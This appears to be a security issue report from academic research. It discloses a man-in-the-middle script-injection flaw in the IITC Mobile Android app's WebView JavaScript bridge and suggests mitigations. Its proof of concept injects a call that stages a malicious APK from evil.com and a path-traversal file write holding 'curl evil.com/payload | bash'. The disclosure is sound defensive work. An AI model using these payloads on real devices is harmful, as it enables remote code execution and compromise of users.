# MITM Script Injection via HTTP Content Loading

## Detection note

This issue was identified through automated LLM-based static analysis of WebView `addJavascriptInterface` bridges, as part of academic security research at the University of Southern Denmark (SDU) in the context of a masters level course named Engineering in Research.

The finding was manually reviewed before submission.

To aid the purposes of our research, we would kindly request acknowledgement of the reported issue as well as a final verdict from the open source community working on this repository, even if the issue is not acted on.

We are reporting in good faith and are happy to answer questions.

## Summary

The JavaScript bridge exposes powerful native capabilities (`saveFile`, `updateIitc`, `copy`, etc.) to any script executing in the WebView. When the `pref_force_https` preference is not set, IITC scripts and plugin updates may be fetched over plain HTTP. A network-positioned attacker (public Wi-Fi, rogue access point, ISP) can intercept these HTTP responses and inject arbitrary JavaScript that immediately gains full access to all bridge methods, enabling path traversal writes and arbitrary APK downloads.

**Severity:** Medium
**Affected version(s):** latest commit on the default branch (commit hash unknown at time of analysis)

---

## Affected file(s)

- `mobile/src/com/cradle/iitc_mobile/async/UpdateScript.java` — `isUpdateAllowed()` (HTTPS gate, optional)
- `mobile/src/com/cradle/iitc_mobile/IITC_WebView.java` — WebView initialization and content loading
- `mobile/src/com/cradle/iitc_mobile/IITC_WebViewClient.java` — URL loading hooks

---

## Vulnerable code

```java
// UpdateScript.java — HTTPS enforcement is preference-gated, not unconditional
boolean isUpdateAllowed(String url) {
    // HTTP fetches proceed when pref_force_https is not set
}
```

---

## Proof of concept

```js
// Injected by MITM attacker into an HTTP-fetched IITC script response:
android.updateIitc("http://evil.com/malware.apk");
// or
android.saveFile(
  "../../Download/backdoor.sh",
  "text/plain",
  "#!/bin/bash\ncurl evil.com/payload | bash"
);
```

A network attacker on the same Wi-Fi network intercepts the HTTP response for an IITC script or plugin update and appends the above payload.

---

## Impact

A network-positioned attacker who can intercept HTTP traffic (public Wi-Fi, rogue AP, ISP-level interception) can inject arbitrary JavaScript into HTTP-fetched IITC content. The injected script runs in the WebView with full access to the native bridge, enabling all attacks described for `saveFile` (path traversal write) and `updateIitc` (arbitrary APK staging). The attacker does not need physical access to the device.

---

## Suggested mitigation

1. Enforce HTTPS unconditionally for all remote script and plugin fetches — remove the HTTP fallback path in `UpdateScript.java`.
2. Enable `pref_force_https` by default, or remove the preference and always require HTTPS.
3. Implement certificate pinning for the IITC update server to prevent interception even with a rogue CA.
4. Consider signing fetched script content and verifying signatures client-side before execution.
